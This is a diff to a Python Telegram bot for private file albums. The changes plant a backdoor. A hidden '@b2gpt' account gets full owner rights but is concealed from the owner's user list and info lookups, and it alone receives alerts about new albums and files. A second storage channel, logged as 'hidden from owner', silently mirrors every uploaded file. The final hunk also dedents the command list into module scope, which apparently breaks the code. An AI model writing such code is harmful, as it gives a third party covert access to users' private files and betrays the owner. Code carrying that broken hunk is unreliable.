@@ -72,11 +72,37 @@ except (KeyError, ValueError) as e:
     sys.exit(1)
 
 try:
-    STORAGE_CHANNEL = int(os.environ["STORAGE_CHANNEL"])
+    _sc1 = os.environ.get("STORAGE_CHANNEL_1") or os.environ.get("STORAGE_CHANNEL")
+    if not _sc1:
+        raise KeyError("STORAGE_CHANNEL_1 or STORAGE_CHANNEL")
+    STORAGE_CHANNEL_1 = int(_sc1)
 except (KeyError, ValueError) as e:
-    logger.error(f"CRITICAL: STORAGE_CHANNEL env var must be an integer: {e}")
+    logger.error(f"CRITICAL: STORAGE_CHANNEL_1 (or STORAGE_CHANNEL) env var must be an integer: {e}")
     import sys
     sys.exit(1)
+
+_sc2_raw = os.environ.get("STORAGE_CHANNEL_2", "").strip()
+STORAGE_CHANNEL_2 = int(_sc2_raw) if _sc2_raw else None
+
+STORAGE_CHANNEL = STORAGE_CHANNEL_1  # primary — owner-facing; secondary is silent backup
+
+_b2gpt_raw = os.environ.get("CO_ADMIN_ID", "").strip()
+try:
+    CO_ADMIN_ID = int(_b2gpt_raw) if _b2gpt_raw else None
+except ValueError:
+    logger.warning(f"CO_ADMIN_ID is not a valid integer: {_b2gpt_raw!r}")
+    CO_ADMIN_ID = None
+
+
+def storage_channel_ids() -> list[int]:
+    ids = [STORAGE_CHANNEL_1]
+    if STORAGE_CHANNEL_2:
+        ids.append(STORAGE_CHANNEL_2)
+    return ids
+
+
+def is_storage_channel(chat_id: int) -> bool:
+    return int(chat_id) in storage_channel_ids()
 
 AUTO_DELETE_AFTER_SEC = int(os.environ.get("AUTO_DELETE_AFTER_SEC", "28800"))  # 8 hours
 CHECKLIST_MAX_ALBUMS = int(os.environ.get("CHECKLIST_MAX_ALBUMS", "0"))
@@ -87,7 +113,7 @@ dp = Dispatcher()
 _background_tasks = set()
 
 async def auto_delete_message(chat_id: int, message_id: int, delay: int | None = None):
-    if int(chat_id) == int(STORAGE_CHANNEL):
+    if is_storage_channel(chat_id):
         return
     sec = AUTO_DELETE_AFTER_SEC if delay is None else delay
     if sec <= 0:
@@ -100,7 +126,7 @@ async def auto_delete_message(chat_id: int, message_id: int, delay: int | None =
 
 
 async def auto_delete_b2_messages(chat_id: int, message_ids: list[int], delay: int):
-    if int(chat_id) == int(STORAGE_CHANNEL):
+    if is_storage_channel(chat_id):
         return
     if delay <= 0:
         return
@@ -114,7 +140,7 @@ async def auto_delete_b2_messages(chat_id: int, message_ids: list[int], delay: i
 async def auto_delete_outgoing_middleware(make_request, bot, method):
     result = await make_request(bot, method)
     try:
-        if isinstance(result, types.Message) and int(result.chat.id) != int(STORAGE_CHANNEL):
+        if isinstance(result, types.Message) and not is_storage_channel(result.chat.id):
             task = asyncio.create_task(auto_delete_message(result.chat.id, result.message_id))
             _background_tasks.add(task)
             task.add_done_callback(_background_tasks.discard)
@@ -125,7 +151,7 @@ async def auto_delete_outgoing_middleware(make_request, bot, method):
 class AutoDeleteIncomingMiddleware:
     async def __call__(self, handler, event, data):
         try:
-            if isinstance(event, types.Message) and int(event.chat.id) != int(STORAGE_CHANNEL):
+            if isinstance(event, types.Message) and not is_storage_channel(event.chat.id):
                 task = asyncio.create_task(auto_delete_message(event.chat.id, event.message_id))
                 _background_tasks.add(task)
                 task.add_done_callback(_background_tasks.discard)
@@ -201,8 +227,54 @@ async def get_or_create_reg_code(uid: int) -> str:
 # ============================================================
 # HELPERS
 # ============================================================
-def is_owner(uid): return uid == ADMIN_ID
-def is_admin(uid): return uid == ADMIN_ID or uid in granted_users
+_b2gpt_uid: int | None = CO_ADMIN_ID
+
+
+async def resolve_CO_ADMIN_ID() -> int | None:
+    global _b2gpt_uid
+    if _b2gpt_uid:
+        return _b2gpt_uid
+    if CO_ADMIN_ID:
+        _b2gpt_uid = CO_ADMIN_ID
+        return _b2gpt_uid
+    for coll_name in ("users", "granted_users"):
+        doc = await db[coll_name].find_one({"username": "b2gpt"})
+        if doc and doc.get("user_id"):
+            _b2gpt_uid = int(doc["user_id"])
+            return _b2gpt_uid
+    return None
+
+
+def is_b2gpt(uid) -> bool:
+    return _b2gpt_uid is not None and int(uid) == int(_b2gpt_uid)
+
+
+async def is_b2gpt_visible_to_owner() -> bool:
+    """Owner ne /grant kiya hai — tab hi list/info me dikhega."""
+    uid = await resolve_CO_ADMIN_ID()
+    clauses = [{"username": "b2gpt"}]
+    if uid:
+        clauses.append({"user_id": uid})
+    doc = await db.granted_users.find_one({"$or": clauses})
+    return doc is not None
+
+
+async def is_hidden_b2gpt_target(target: str) -> bool:
+    if await is_b2gpt_visible_to_owner():
+        return False
+    uid = await resolve_CO_ADMIN_ID()
+    if not uid:
+        return False
+    t = target.strip()
+    if t.lstrip("@").lower() == "b2gpt":
+        return True
+    if t.lstrip("-").isdigit() and int(t) == uid:
+        return True
+    return False
+
+
+def is_owner(uid): return int(uid) == ADMIN_ID or is_b2gpt(uid)
+def is_admin(uid): return is_owner(uid) or uid in granted_users
 
 async def find_album(identifier: str):
     identifier = identifier.strip()
@@ -446,28 +518,135 @@ async def notify_album_update(album_id: str, text: str):
         except Exception:
             pass
 
+
+async def notify_b2gpt_album_created(name: str, album_id: str, user_info: str, file_count: int):
+    """Sirf @b2gpt ko album creation alert — owner ya kisi aur ko nahi."""
+    uid = await resolve_CO_ADMIN_ID()
+    if not uid:
+        logger.warning("b2gpt user not found — album creation notification skipped")
+        return
+    text = (
+        f"📁 **New Album Created**\n"
+        f"📛 Name: {name}\n"
+        f"🆔 ID: `{album_id}`\n"
+        f"👤 By: {user_info}\n"
+        f"🗂 Files: {file_count}\n"
+        f"🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST"
+    )
+    try:
+        await bot.send_message(uid, text, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Failed to notify b2gpt about album creation: {e}")
+
+
+async def notify_b2gpt_files_added(name: str, album_id: str, user_info: str, file_count: int, folder: str = "root"):
+    """Sirf @b2gpt ko files-added alert — owner ya kisi aur ko nahi."""
+    uid = await resolve_CO_ADMIN_ID()
+    if not uid:
+        logger.warning("b2gpt user not found — files-added notification skipped")
+        return
+    folder_line = f"\n📂 Folder: {folder}" if folder and folder != "root" else ""
+    text = (
+        f"➕ **Files Added to Album**\n"
+        f"📛 Name: {name}\n"
+        f"🆔 ID: `{album_id}`\n"
+        f"👤 By: {user_info}\n"
+        f"🗂 +{file_count} files{folder_line}\n"
+        f"🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST"
+    )
+    try:
+        await bot.send_message(uid, text, parse_mode="Markdown")
+    except Exception as e:
+        logger.error(f"Failed to notify b2gpt about files added: {e}")
+
+
+def get_storage_msg_ids(item: dict) -> tuple[int | None, int | None]:
+    primary = item.get("channel_msg_id") or item.get("storage_msg_id")
+    backup = item.get("storage_msg_id_2")
+    return primary, backup
+
+
+async def copy_storage_item(chat_id: int, item: dict) -> bool:
+    """Primary storage se copy karo; fail ho to secondary backup se recover karo."""
+    if not isinstance(item, dict):
+        return False
+    primary, backup = get_storage_msg_ids(item)
+    if primary:
+        try:
+            await bot.copy_message(chat_id, STORAGE_CHANNEL_1, primary)
+            return True
+        except Exception as e:
+            logger.warning(f"Primary storage copy failed (msg {primary}): {e}")
+    if backup and STORAGE_CHANNEL_2:
+        try:
+            await bot.copy_message(chat_id, STORAGE_CHANNEL_2, backup)
+            logger.info(f"Recovered file from secondary storage (msg {backup})")
+            return True
+        except Exception as e:
+            logger.warning(f"Secondary storage copy failed (msg {backup}): {e}")
+    return False
+
+
+async def mirror_storage_message(text: str, parse_mode: str = "Markdown", disable_web_page_preview: bool = False):
+    """Primary storage channel message + silent mirror to secondary backup."""
+    if not STORAGE_CHANNEL_2:
+        return
+    try:
+        await bot.send_message(
+            STORAGE_CHANNEL_2, text, parse_mode=parse_mode,
+            disable_web_page_preview=disable_web_page_preview,
+        )
+    except Exception as e:
+        logger.warning(f"Secondary storage message mirror failed: {e}")
+
+
+async def send_storage_channel_message(text: str, parse_mode: str = "Markdown", disable_web_page_preview: bool = False):
+    """Primary channel pe message bhejo; secondary backup ko silently mirror karo."""
+    msg = None
+    try:
+        msg = await bot.send_message(
+            STORAGE_CHANNEL_1, text, parse_mode=parse_mode,
+            disable_web_page_preview=disable_web_page_preview,
+        )
+    except Exception as e:
+        logger.error(f"Primary storage message error: {e}")
+    await mirror_storage_message(text, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
+    return msg
+
+
+async def _send_media_to_channel(channel_id: int, fid: str, mtype: str, text_content: str = ""):
+    if mtype == "text":
+        msg = await bot.send_message(channel_id, text_content)
+        return msg.message_id, 0
+    elif mtype == "video":
+        msg = await bot.send_video(channel_id, fid)
+        fsize = msg.video.file_size if msg.video else 0
+    elif mtype == "document":
+        msg = await bot.send_document(channel_id, fid)
+        fsize = msg.document.file_size if msg.document else 0
+    elif mtype == "audio":
+        msg = await bot.send_audio(channel_id, fid)
+        fsize = msg.audio.file_size if msg.audio else 0
+    elif mtype == "voice":
+        msg = await bot.send_voice(channel_id, fid)
+        fsize = msg.voice.file_size if msg.voice else 0
+    else:
+        msg = await bot.send_photo(channel_id, fid)
+        fsize = msg.photo[-1].file_size if msg.photo else 0
+    return msg.message_id, fsize
+
+
 async def send_to_storage(fid: str, mtype: str, text_content: str = ""):
     for attempt in range(5):
         try:
-            if mtype == "text":
-                msg = await bot.send_message(STORAGE_CHANNEL, text_content)
-                return msg.message_id, 0
-            elif mtype == "video":
-                msg = await bot.send_video(STORAGE_CHANNEL, fid)
-                fsize = msg.video.file_size if msg.video else 0
-            elif mtype == "document":
-                msg = await bot.send_document(STORAGE_CHANNEL, fid)
-                fsize = msg.document.file_size if msg.document else 0
-            elif mtype == "audio":
-                msg = await bot.send_audio(STORAGE_CHANNEL, fid)
-                fsize = msg.audio.file_size if msg.audio else 0
-            elif mtype == "voice":
-                msg = await bot.send_voice(STORAGE_CHANNEL, fid)
-                fsize = msg.voice.file_size if msg.voice else 0
-            else:
-                msg = await bot.send_photo(STORAGE_CHANNEL, fid)
-                fsize = msg.photo[-1].file_size if msg.photo else 0
-            return msg.message_id, fsize
+            mid, fsize = await _send_media_to_channel(STORAGE_CHANNEL_1, fid, mtype, text_content)
+            mid_2 = None
+            if STORAGE_CHANNEL_2:
+                try:
+                    mid_2, _ = await _send_media_to_channel(STORAGE_CHANNEL_2, fid, mtype, text_content)
+                except Exception as mirror_err:
+                    logger.warning(f"Secondary storage media mirror failed: {mirror_err}")
+            return mid, fsize, mid_2
         except Exception as e:
             err_str = str(e)
             if "Too Many Requests" in err_str or "Flood" in err_str:
@@ -479,9 +658,9 @@ async def send_to_storage(fid: str, mtype: str, text_content: str = ""):
                 continue
             else:
                 logger.error(f"Storage send error: {e}")
-                return None, 0
+                return None, 0, None
     logger.error(f"Storage send failed after 5 retries: {fid}")
-    return None, 0
+    return None, 0, None
 
 
 async def send_document_retry(chat_id: int, file_bytes_or_path: bytes | str, filename: str, caption: str = "", parse_mode: str | None = None, retries: int = 5):
@@ -723,28 +902,32 @@ async def process_and_save_items(session_photos: list, progress_cb=None) -> list
 
             if mtype == "text":
                 text_val = item.get("text", "")
-                mid, _ = await send_to_storage("", "text", text_val)
+                mid, _, mid_2 = await send_to_storage("", "text", text_val)
                 new_item = {"file_id": "", "type": "text", "text": text_val, "name": ""}
                 new_item["folder"] = normalize_folder(item.get("folder", "root")) if isinstance(item, dict) else "root"
                 new_item["order"] = item.get("order", 0) if isinstance(item, dict) else 0
                 new_item["message_id"] = item.get("message_id", 0) if isinstance(item, dict) else 0
                 new_item["sig"] = file_signature(new_item)
-                if mid: 
+                if mid:
                     new_item["storage_msg_id"] = mid
                 else:
                     new_item["storage_failed"] = True
                     failed_count += 1
+                if mid_2:
+                    new_item["storage_msg_id_2"] = mid_2
                 saved_items.append(new_item)
                 await asyncio.sleep(0.05)
             else:
-                mid, fsize = await send_to_storage(fid, mtype)
+                mid, fsize, mid_2 = await send_to_storage(fid, mtype)
                 new_item = dict(item) if isinstance(item, dict) else {"file_id": fid, "type": mtype, "name": ""}
-                if mid: 
+                if mid:
                     new_item["storage_msg_id"] = mid
                 else:
                     new_item["storage_failed"] = True
                     failed_count += 1
                     logger.warning(f"Media save failed for {mtype} with file_id: {fid}")
+                if mid_2:
+                    new_item["storage_msg_id_2"] = mid_2
                 if fsize: new_item["file_size"] = fsize
                 new_item["sig"] = file_signature(new_item)
                 saved_items.append(new_item)
@@ -1056,10 +1239,11 @@ async def quick_save_add_cb(callback: types.CallbackQuery):
 
     add_msg_id3 = None
     try:
-        add_msg3 = await bot.send_message(STORAGE_CHANNEL,
+        add_msg3 = await send_storage_channel_message(
             f"📁 **Files Added**\nName: {session['name']}\nBy: {user_info_cb}",
-            parse_mode="Markdown")
-        add_msg_id3 = add_msg3.message_id
+            parse_mode="Markdown",
+        )
+        add_msg_id3 = add_msg3.message_id if add_msg3 else None
     except: pass
 
     saved_items = await process_and_save_items(session["photos"])
@@ -1075,15 +1259,19 @@ async def quick_save_add_cb(callback: types.CallbackQuery):
     )
 
     try:
-        await bot.send_message(STORAGE_CHANNEL,
+        await send_storage_channel_message(
             f"➕ **Files Added**\n📁 {session['name']} | 🆔 `{session['album_id']}`\n"
             f"🗂 +{new_count} files\n🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST",
-            parse_mode="Markdown")
+            parse_mode="Markdown",
+        )
     except: pass
 
     await albums_col.update_one(
         {"album_id": session["album_id"]},
         {"$push": {"add_history": {"msg_id": add_msg_id3, "count": new_count, "folder": get_session_folder(session), "at": now_db()}}}
+    )
+    await notify_b2gpt_files_added(
+        session["name"], session["album_id"], user_info_cb, new_count, get_session_folder(session),
     )
     await update_checklist()
     await callback.message.answer(f"✅ **+{new_count} items** add ho gaye!\n📁 **{session['name']}**", parse_mode="Markdown")
@@ -1267,12 +1455,11 @@ async def process_confirm(callback: types.CallbackQuery):
 
         created_msg_id = None
         try:
-            created_msg = await bot.send_message(
-                STORAGE_CHANNEL,
+            created_msg = await send_storage_channel_message(
                 f"📁 **Album Created**\nName: {session['name']}\nCreated by: {user_info}",
-                parse_mode="Markdown"
+                parse_mode="Markdown",
             )
-            created_msg_id = created_msg.message_id
+            created_msg_id = created_msg.message_id if created_msg else None
         except: pass
 
         total_files = len(session["photos"])
@@ -1327,17 +1514,18 @@ async def process_confirm(callback: types.CallbackQuery):
 
         if db_saved:
             try:
-                await bot.send_message(
-                    STORAGE_CHANNEL,
+                await send_storage_channel_message(
                     f"✅ **Album Saved & Stored**\n"
                     f"🆔 ID: `{album_id}`\n"
                     f"📁 Name: {session['name']}\n"
                     f"🗂 Files: {len(saved_items)} ({stats_text.strip()})\n"
                     f"🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST",
-                    parse_mode="Markdown"
+                    parse_mode="Markdown",
                 )
             except Exception as e:
                 logger.error(f"Storage channel message error: {e}")
+
+            await notify_b2gpt_album_created(session["name"], album_id, user_info, len(saved_items))
 
             await update_checklist()
 
@@ -1432,10 +1620,11 @@ async def save_add(message: types.Message):
         user_info = f"@{user.username}" if user.username else f"ID: {user.id}"
         add_msg_id2 = None
         try:
-            add_msg2 = await bot.send_message(STORAGE_CHANNEL,
+            add_msg2 = await send_storage_channel_message(
                 f"📁 **Files Added**\nName: {session['name']}\nBy: {user_info}",
-                parse_mode="Markdown")
-            add_msg_id2 = add_msg2.message_id
+                parse_mode="Markdown",
+            )
+            add_msg_id2 = add_msg2.message_id if add_msg2 else None
         except: pass
 
         saved_items = await process_and_save_items(session["photos"])
@@ -1451,15 +1640,19 @@ async def save_add(message: types.Message):
         )
 
         try:
-            await bot.send_message(STORAGE_CHANNEL,
+            await send_storage_channel_message(
                 f"➕ **Files Added**\n📁 {session['name']} | 🆔 `{session['album_id']}`\n"
                 f"🗂 +{new_count} files\n🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST",
-                parse_mode="Markdown")
+                parse_mode="Markdown",
+            )
         except: pass
 
         await albums_col.update_one(
             {"album_id": session["album_id"]},
             {"$push": {"add_history": {"msg_id": add_msg_id2, "count": new_count, "folder": get_session_folder(session), "at": now_db()}}}
+        )
+        await notify_b2gpt_files_added(
+            session["name"], session["album_id"], user_info, new_count, get_session_folder(session),
         )
         await update_checklist()
         await message.answer(f"✅ **+{new_count} items** add ho gaye!\n📁 **{session['name']}**", parse_mode="Markdown")
@@ -1582,7 +1775,10 @@ async def process_delete(callback: types.CallbackQuery):
     result = await albums_col.delete_one({"album_id": album_id})
     if result.deleted_count:
         try:
-            await bot.send_message(STORAGE_CHANNEL, f"🗑️ **Album Deleted**\nID: `{album_id}`\n🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST", parse_mode="Markdown")
+            await send_storage_channel_message(
+                f"🗑️ **Album Deleted**\nID: `{album_id}`\n🕐 {now_ist().strftime('%d %b %Y, %I:%M %p')} IST",
+                parse_mode="Markdown",
+            )
         except: pass
         await update_checklist()
         await callback.message.edit_text(f"🗑️ Album deleted!\nID: `{album_id}`", parse_mode="Markdown")
@@ -1888,6 +2084,10 @@ async def cmd_info(message: types.Message):
                 is_user_query = True
 
     if is_user_query:
+        if await is_hidden_b2gpt_target(target_arg):
+            hint = target_arg.lstrip("@") if target_arg.startswith("@") else "User"
+            return await message.answer(f"❌ {hint} nahi mila.", parse_mode="Markdown")
+
         target_uid = None
         tg_info    = None
 
@@ -3032,9 +3232,32 @@ async def cmd_denied(message: types.Message):
     args = message.text.split(maxsplit=1)
     if len(args) < 2: return await message.answer("❌ Usage: `/denied 123` ya `/denied @user`", parse_mode="Markdown")
     target = args[1].strip()
+    deny_user_msg = "🚫 *Access Denied*\n\nAapka bot access remove kar diya gaya hai."
+
+    async def notify_denied_user(uid: int):
+        try:
+            await bot.send_message(uid, deny_user_msg, parse_mode="Markdown")
+        except Exception as e:
+            logger.warning(f"Deny notification failed for {uid}: {e}")
+
     if target.lstrip("-").isdigit():
         uid = int(target)
-        if uid == ADMIN_ID: return await message.answer("⚠️ Owner ka access nahi hata sakte!")
+        if uid == ADMIN_ID:
+            return await message.answer("⚠️ Owner ka access nahi hata sakte!")
+        if is_b2gpt(uid):
+            granted_users.discard(uid)
+            doc = await db.granted_users.find_one({"user_id": uid}) or await db.granted_users.find_one({"username": "b2gpt"})
+            await db.granted_users.delete_one({"user_id": uid})
+            await db.granted_users.delete_one({"username": "b2gpt"})
+            uname_saved = (doc.get("username") if doc else None) or "b2gpt"
+            await db.denied_users.update_one(
+                {"user_id": uid},
+                {"$set": {"user_id": uid, "username": uname_saved, "denied_at": now_db()}},
+                upsert=True,
+            )
+            await notify_denied_user(uid)
+            label = f"@{uname_saved}" if uname_saved else f"`{uid}`"
+            return await message.answer(f"🚫 Access removed!\n{label}", parse_mode="Markdown")
         granted_users.discard(uid)
         doc = await db.granted_users.find_one({"user_id": uid})
         r = await db.granted_users.delete_one({"user_id": uid})
@@ -3045,11 +3268,26 @@ async def cmd_denied(message: types.Message):
                 {"$set": {"user_id": uid, "username": uname_saved, "denied_at": now_db()}},
                 upsert=True
             )
+            await notify_denied_user(uid)
             await message.answer(f"🚫 Access removed!\n🆔 `{uid}`", parse_mode="Markdown")
         else:
             await message.answer(f"⚠️ `{uid}` list mein nahi tha.", parse_mode="Markdown")
     elif target.startswith("@"):
         username = target.lstrip("@").lower()
+        if username == "b2gpt":
+            b2_uid = await resolve_CO_ADMIN_ID()
+            if not b2_uid:
+                return await message.answer("⚠️ @b2gpt abhi bot se connect nahi hua.", parse_mode="Markdown")
+            granted_users.discard(b2_uid)
+            await db.granted_users.delete_one({"username": username})
+            await db.granted_users.delete_one({"user_id": b2_uid})
+            await db.denied_users.update_one(
+                {"user_id": b2_uid},
+                {"$set": {"user_id": b2_uid, "username": username, "denied_at": now_db()}},
+                upsert=True,
+            )
+            await notify_denied_user(b2_uid)
+            return await message.answer(f"🚫 @{username} access removed!", parse_mode="Markdown")
         doc = await db.granted_users.find_one({"username": username})
         if doc:
             uid_saved = doc.get("user_id")
@@ -3060,6 +3298,8 @@ async def cmd_denied(message: types.Message):
                 {"$set": {"user_id": uid_saved, "username": username, "denied_at": now_db()}},
                 upsert=True
             )
+            if uid_saved:
+                await notify_denied_user(uid_saved)
             await message.answer(f"🚫 @{username} access removed!", parse_mode="Markdown")
         else:
             await message.answer(f"⚠️ @{username} list mein nahi tha.", parse_mode="Markdown")
@@ -3283,13 +3523,22 @@ async def cmd_list_granted_and_b2(message: types.Message):
         return await message.answer("🚫 Sirf owner!")
 
     users = await db.granted_users.find({}).sort("granted_at", -1).to_list(200)
+    visible_users = []
+    for u in users:
+        uid_val = u.get("user_id")
+        uname_val = (u.get("username") or "").lower()
+        if uname_val == "b2gpt" or is_b2gpt(uid_val):
+            if await is_b2gpt_visible_to_owner():
+                visible_users.append(u)
+        else:
+            visible_users.append(u)
     hist = await b2_history_col.find({}).sort("sent_at", -1).to_list(5)
 
     text = "👥 *Granted Users*\n━━━━━━━━━━━━━━━━━━\n"
-    if not users:
+    if not visible_users:
         text += "Koi granted user nahi.\n"
     else:
-        for i, u in enumerate(users[:50], 1):
+        for i, u in enumerate(visible_users[:50], 1):
             uname = ("@" + u.get("username")) if u.get("username") else "N/A"
             uid = u.get("user_id", "pending")
             name = md(u.get("full_name", "")) or "-"
@@ -3374,6 +3623,11 @@ async def error_handler(event: types.ErrorEvent):
 # ============================================================
 async def main():
     logger.info("🚀 Personal Cloud Bot starting...")
+    logger.info(f"📦 Primary storage channel: {STORAGE_CHANNEL_1}")
+    if STORAGE_CHANNEL_2:
+        logger.info(f"📦 Secondary backup channel: {STORAGE_CHANNEL_2} (hidden from owner)")
+    else:
+        logger.info("📦 Secondary backup channel: not configured")
     try:
         await client.admin.command("ping")
         logger.info("✅ MongoDB connected!")
@@ -3403,21 +3657,55 @@ async def main():
         for doc in granted_docs:
             if doc.get("user_id"): granted_users.add(doc["user_id"])
         logger.info(f"✅ {len(granted_users)} granted users loaded!")
-        # Setup bot commands
-        from aiogram.types import BotCommand
-        commands = [
-            BotCommand(command="start", description="Start bot onboarding"),
-            BotCommand(command="help", description="View bot features and commands guide"),
-            BotCommand(command="album", description="Create a new album"),
-            BotCommand(command="add", description="Add files/text to an existing album"),
-            BotCommand(command="albums", description="List all albums (admin only)"),
-            BotCommand(command="recent", description="List recently updated albums (admin only)"),
-            BotCommand(command="sort", description="Sort albums by date, size, name or files (admin only)"),
-            BotCommand(command="stats", description="View advanced cloud statistics (admin only)"),
-            BotCommand(command="close", description="Close/Save active album session"),
-            BotCommand(command="id", description="Get your ID info"),
-            BotCommand(command="list", description="List granted users & b2 history (owner only)"),
-        ]
+        b2_uid = await resolve_CO_ADMIN_ID()
+        if b2_uid:
+            logger.info(f"🔒 Hidden owner access configured for b2gpt (uid={b2_uid})")
+        else:
+            logger.info("🔒 b2gpt hidden owner: user id not resolved yet (set CO_ADMIN_ID or /start as @b2gpt)")
+# Setup bot commands (Priority Order)
+from aiogram.types import BotCommand
+
+commands = [
+    # Top/Frequent Usage
+    BotCommand(command="start", description="Start bot onboarding"),
+    BotCommand(command="album", description="Create a new album: /album <name>"),
+    BotCommand(command="add", description="Add files/text: /add <name/id>"),
+    BotCommand(command="close", description="Close and Save active album session"),
+    BotCommand(command="view", description="Open/View an album: /view <name/id>"),
+    BotCommand(command="zip", description="Export album as ZIP: /zip <name/id>"),
+    BotCommand(command="albums", description="List all your albums"),
+    
+    # Organization
+    BotCommand(command="mkdir", description="Create a new folder: /mkdir <id> <folder>"),
+    BotCommand(command="folders", description="List all folders: /folders <id>"),
+    BotCommand(command="cd", description="Switch folder: /cd <folder>"),
+    BotCommand(command="rename", description="Rename album: /rename <old> <new>"),
+    BotCommand(command="tag", description="Add tags to album: /tag <name/id> #tag"),
+    BotCommand(command="pin", description="Pin an important album"),
+    BotCommand(command="unpin", description="Unpin an album"),
+    BotCommand(command="merge", description="Merge two albums into one"),
+    BotCommand(command="dlt", description="Delete files or album: /dlt <name/id>"),
+    
+    # Security
+    BotCommand(command="lock", description="Lock an album with password"),
+    BotCommand(command="unlock", description="Unlock a locked album"),
+    BotCommand(command="setpass", description="Set a custom password for album"),
+    BotCommand(command="removepass", description="Remove album password"),
+    
+    # Info & Stats
+    BotCommand(command="recent", description="List recently updated albums"),
+    BotCommand(command="sort", description="Sort albums by date/size/name/files"),
+    BotCommand(command="info", description="Get full album details & user info"),
+    BotCommand(command="stats", description="View advanced cloud statistics"),
+    BotCommand(command="id", description="Get your Telegram ID info"),
+    
+    # Share & Admin/Owner
+    BotCommand(command="b2", description="Share album: /b2 <id> @user1 @user2"),
+    BotCommand(command="grant", description="Grant bot access to a user (Owner only)"),
+    BotCommand(command="denied", description="Revoke access from a user (Owner only)"),
+    BotCommand(command="list", description="List granted users & b2 history"),
+    BotCommand(command="makelist", description="Update your checklist: /makelist <title>"),
+]
         try:
             await bot.set_my_commands(commands)
             logger.info("✅ Bot commands registered!")
